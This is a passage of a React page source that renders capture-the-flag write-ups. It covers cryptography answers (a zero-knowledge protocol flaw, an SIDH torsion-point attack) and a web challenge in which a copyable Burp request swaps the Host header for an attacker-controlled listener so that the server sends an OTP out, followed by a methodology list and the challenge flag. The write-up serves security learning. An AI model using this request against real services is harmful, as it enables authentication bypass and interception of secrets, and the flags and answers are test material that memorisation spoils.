                    In interactive identification protocols (like Schnorr or Fiat-Shamir variants), the prover must commit before receiving the verifier&apos;s random challenge. If the verifier emits the challenge prior to receiving the commitment, or allows the prover to dictate challenge ordering, the simulator can forge valid proofs without possessing the private discrete logarithm.
                  </p>
                </div>

                <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-4 font-mono text-sm relative overflow-hidden">
                  <div className="absolute top-0 left-0 w-1 h-full bg-green-500"></div>
                  <p className="text-zinc-400 mb-1"><span className="text-zinc-600">Q:</span> How was the Zero-Knowledge Proof bypassed?</p>
                  <p className="text-green-400"><span className="text-zinc-600">A:</span> <code className="bg-black/50 px-2 py-0.5 rounded text-green-300">Interactive Message Inversion (HVZK Attack)</code></p>
                </div>
              </div>

              {/* Part 3 */}
              <div id="crypto-part-3" className="scroll-mt-28 space-y-4 mb-8">
                <h3 className="text-xl font-bold text-white font-[family-name:var(--font-share-tech)] flex items-center gap-2">
                  <span className="text-emerald-400">3.</span> Supersingular Isogeny Diffie-Hellman (Crypto 3)
                </h3>

                <div className="bg-[#111111] border-l-4 border-blue-500 p-5 rounded-r-xl shadow-lg">
                  <h4 className="text-blue-400 font-bold mb-1 font-mono text-xs">Post-Quantum Analysis: SIDH Torsion Point Attack</h4>
                  <p className="text-sm text-zinc-400 leading-relaxed font-sans">
                    Supersingular Isogeny Diffie-Hellman protocols exchange images of auxiliary torsion points to evaluate shared secrets. Providing auxiliary point images allows an adversary to evaluate the endomorphism ring structure (Castryck-Decru attack style), recovering the private isogeny degree step-by-step using Vélu&apos;s formulas.
                  </p>
                </div>

                <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-4 font-mono text-sm relative overflow-hidden">
                  <div className="absolute top-0 left-0 w-1 h-full bg-green-500"></div>
                  <p className="text-zinc-400 mb-1"><span className="text-zinc-600">Q:</span> What method was used to derive the shared j-invariant?</p>
                  <p className="text-green-400"><span className="text-zinc-600">A:</span> <code className="bg-black/50 px-2 py-0.5 rounded text-green-300">Vélu&apos;s Formulas for Isogeny Chains</code></p>
                </div>
              </div>
            </article>

            {/* ------------------------------------------------------------- */}
            {/* CHALLENGE 07: SOL-NET NODE                                    */}
            {/* ------------------------------------------------------------- */}
            <article id="sol-net" className="scroll-mt-24 bg-[#0a0a0f]/90 border border-zinc-800 rounded-3xl p-6 sm:p-8 backdrop-blur-xl relative overflow-hidden shadow-2xl">

              <div className="mt-6 border-b border-zinc-800/80 pb-6 mb-6">
                <div className="flex flex-wrap items-center gap-2 mb-3">
                  <span className="bg-yellow-500/10 text-yellow-400 border border-yellow-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                    AUTH BYPASS // SSRF
                  </span>
                  <span className="bg-zinc-900 text-zinc-400 border border-zinc-800 font-mono text-xs px-2.5 py-0.5 rounded">
                    WEB SECURITY &amp; WEBHOOK INTERCEPTION
                  </span>
                </div>
                <h2 className="text-2xl sm:text-3xl font-extrabold text-white font-[family-name:var(--font-share-tech)] mb-2">
                  Sol-Net: Node Auth Bypass
                </h2>
                <p className="text-zinc-400 text-sm font-sans">
                  Exploiting an authentication bypass on an enterprise telemetry gateway. Bypassing host header checks and redirecting outbound OTP webhooks in Burp Suite.
                </p>
              </div>

              {/* Stage 1 */}
              <div id="sol-stage-1" className="scroll-mt-28 space-y-4 mb-8">
                <h3 className="text-xl font-bold text-white font-[family-name:var(--font-share-tech)] flex items-center gap-2">
                  <span className="text-yellow-400">Stage 1:</span> OTP Redirection &amp; Host Override
                </h3>

                <div className="bg-[#111111] border-l-4 border-blue-500 p-5 rounded-r-xl shadow-lg">
                  <h4 className="text-blue-400 font-bold mb-1 font-mono text-xs">Web Security: Host Header Webhook Poisoning</h4>
                  <p className="text-sm text-zinc-400 leading-relaxed font-sans">
                    The backend authentication service generated an outbound OTP webhook request by constructing the callback target from the client-supplied <code>Host</code> header without strict domain allowlisting. By replacing the <code>Host</code> header with an attacker-controlled endpoint while preserving <code>X-Original-Host</code>, the server dispatched the plaintext OTP directly to our listener.
                  </p>
                </div>

                <div className="bg-[#050505] border border-zinc-800 rounded-xl p-4 font-mono text-xs text-zinc-400 overflow-x-auto shadow-inner">
                  <div className="flex justify-between items-center mb-2 border-b border-zinc-800 pb-2">
                    <span className="text-zinc-500 font-bold">Burp Suite Repeater</span>
                    <CopyButton text={`POST /api/v1/node/otp HTTP/1.1\nHost: attacker.burpcollaborator.net\nX-Original-Host: core.solnet.local`} />
                  </div>
                  <pre>
                    <code className="text-zinc-300">
                      <span className="text-pink-400">POST</span> /api/v1/node/otp <span className="text-pink-400">HTTP/1.1</span><br/>
                      <span className="text-yellow-300">Host:</span> <span className="text-green-300">attacker.burpcollaborator.net</span><br/>
                      <span className="text-yellow-300">X-Original-Host:</span> core.solnet.local<br/>
                      <br/>
                      &#123;<br/>
                      &nbsp;&nbsp;<span className="text-orange-300">&quot;node_id&quot;</span>: <span className="text-green-300">&quot;CORE_ADMIN_01&quot;</span><br/>
                      &#125;<br/>
                      <br/>
                      <span className="text-zinc-500">/* WEBHOOK LEAKS RAW OTP: */</span><br/>
                      <span className="text-orange-300">&quot;token&quot;</span>: <span className="text-green-300">&quot;992481&quot;</span>
                    </code>
                  </pre>
                </div>
              </div>

              {/* Methodology */}
              <div id="sol-methodology" className="scroll-mt-28 space-y-4 mb-8">
                <details className="group bg-[#0a0a0a]/50 border border-zinc-800 rounded-xl overflow-hidden transition-all duration-300">
                  <summary className="p-4 cursor-pointer font-mono text-xs text-zinc-400 hover:text-white flex items-center justify-between list-none">
                    <span>[ SHOW METHODOLOGY: Exploit Chaining &amp; SSRF ]</span>
                    <span className="transition group-open:rotate-180">▼</span>
                  </summary>
                  <div className="p-5 pt-0 border-t border-zinc-800/50 text-xs text-zinc-400 leading-relaxed bg-[#050505] font-mono">
                    <ol className="list-decimal pl-5 space-y-2 marker:text-yellow-500">
                      <li>Identify the endpoint triggering OTP generation for the Core Node.</li>
                      <li>Overriding the primary <code>Host</code> header during internal SSRF redirection.</li>
                      <li>Set up a Burp Collaborator listener to capture the incoming HTTP POST webhook.</li>
                      <li>Extract the cleartext 6-digit OTP token and submit to complete bypass.</li>
                    </ol>
                  </div>
                </details>
              </div>

              {/* Flag */}
              <div id="sol-flag" className="scroll-mt-28 space-y-6">
                <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-5 font-mono text-sm relative overflow-hidden break-all shadow-lg shadow-green-500/10">
                  <div className="absolute top-0 left-0 w-1 h-full bg-green-500"></div>
                  <div className="text-zinc-400 mb-1">Access Level: <code className="text-pink-300">CORE_ADMIN_CLEARANCE</code></div>
                  <div className="text-zinc-400 mb-3">OTP Interception: <code className="text-pink-300">SSRF Webhook Override</code></div>
                  <div className="text-zinc-400 mb-1 font-bold text-xs uppercase tracking-wider">Final Submitted Flag:</div>
                  <div className="text-white bg-green-900/40 border border-green-500/30 p-3 rounded-lg text-sm font-bold flex items-center justify-between gap-2">
                    <code>ASCWG&#123;s0l4r_n0d3_0tp_byp4ss_m4st3r&#125;</code>
                    <CopyButton text="ASCWG{s0l4r_n0d3_0tp_byp4ss_m4st3r}" />
                  </div>
                </div>
              </div>
            </article>

          </div>

          {/* ================= RIGHT / STICKY SLIDER RAIL ================= */}
          <aside className="hidden lg:block w-80 shrink-0 sticky top-24 self-start">
            <div className="max-h-[calc(100vh-7rem)] overflow-y-auto no-scrollbar bg-[#0d0d12]/95 border border-zinc-800 rounded-2xl p-4 backdrop-blur-xl shadow-2xl flex flex-col">
              <div className="flex items-center justify-between pb-3 mb-3 border-b border-zinc-800/80 shrink-0">
                <span className="font-mono text-[11px] text-zinc-300 font-bold uppercase tracking-widest flex items-center gap-2">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
                  CHALLENGE INDEX
                </span>
                <span className="font-mono text-[10px] text-zinc-400 bg-zinc-900 border border-zinc-800 px-2 py-0.5 rounded font-bold">
                  7 LABS
                </span>
              </div>

              <p className="text-[11px] text-zinc-400 mb-3 font-mono shrink-0">
                Click any challenge to jump to its full writeup:
              </p>

              {/* Navigation List */}
              <nav className="flex flex-col gap-2.5 overflow-y-auto no-scrollbar pr-0.5">
                {challenges.map((c) => {
                  const isChallengeActive = activeChallengeId === c.id;
                  return (
                    <div
                      key={c.id}
                      className={`rounded-xl border transition-all duration-300 overflow-hidden ${
                        isChallengeActive
                          ? "bg-zinc-900/90 border-white text-white shadow-[0_0_20px_rgba(255,255,255,0.12)]"
                          : "bg-black/40 border-zinc-800/80 text-zinc-400 hover:border-zinc-700 hover:text-zinc-300"
                      }`}
                    >
                      {/* Main Challenge Jump Button */}
                      <button
                        onClick={() => scrollToElement(c.id)}
                        className="w-full text-left p-3 flex flex-col gap-1 focus:outline-none transition-colors"
                      >
                        <div className="flex items-center justify-between">
                          <span className={`font-mono text-[10px] uppercase font-bold ${
                            isChallengeActive ? "text-zinc-300" : "text-zinc-500"
                          }`}>
                            LAB #{c.num}
                          </span>
                          <span
                            className={`text-[9px] font-mono px-1.5 py-0.5 rounded border ${
                              isChallengeActive
                                ? "border-emerald-500/50 text-emerald-400 bg-emerald-500/10 font-bold"
                                : "border-zinc-800 text-zinc-500"
                            }`}
                          >
                            {c.points}
                          </span>
                        </div>
                        <span className={`font-bold text-xs uppercase tracking-wider ${
                          isChallengeActive ? "text-white" : "text-zinc-300"
                        }`}>
                          {c.title}
                        </span>
                        <span className="text-[10px] font-mono text-zinc-500 truncate">
                          {c.category}
                        </span>
                      </button>

                      {/* Content Headers / Stages Sub-Menu */}
                      {c.sections && c.sections.length > 0 && (
                        <div className={`border-t border-zinc-800/80 px-2.5 py-2 space-y-1 transition-all ${
                          isChallengeActive ? "bg-black/60 block" : "hidden hover:block"
                        }`}>
                          <span className="text-[9px] font-mono text-zinc-500 uppercase tracking-wider block px-1 mb-1 font-bold">
                            CONTENT HEADERS:
                          </span>
                          {c.sections.map((sec) => {
                            const isSecActive = activeSectionId === sec.id;
                            return (
                              <button
                                key={sec.id}
                                onClick={(e) => {
                                  e.stopPropagation();
                                  scrollToElement(sec.id);
                                }}
                                className={`w-full text-left px-2 py-1 rounded text-[11px] font-mono transition-all flex items-center justify-between gap-1.5 ${
                                  isSecActive
                                    ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 font-bold shadow-[0_0_10px_rgba(16,185,129,0.2)]"
                                    : "text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800/60"
                                }`}
                              >
                                <span className="truncate flex items-center gap-1.5">
                                  <span className={isSecActive ? "text-emerald-400 font-bold" : "text-zinc-600"}>
                                    {isSecActive ? "▶" : "•"}
                                  </span>
                                  <span>{sec.title}</span>
                                </span>
                                <span className="text-[9px] text-zinc-500 shrink-0 font-normal">
                                  {sec.tag}
                                </span>
                              </button>
                            );
                          })}
                        </div>
                      )}
                    </div>
                  );
                })}
              </nav>

              <div className="mt-4 pt-3 border-t border-zinc-800/80 flex flex-col gap-2 shrink-0">
                <Link
                  href="/ctfs"
                  className="w-full text-center py-2 px-3 rounded-xl bg-zinc-900 hover:bg-zinc-800 border border-zinc-800 text-zinc-300 hover:text-white font-mono text-xs transition-colors flex items-center justify-center gap-1.5"
                >
                  ← Back to All CTFs
                </Link>
              </div>
            </div>
          </aside>

        </div>
      </main>
    </div>
  );
}
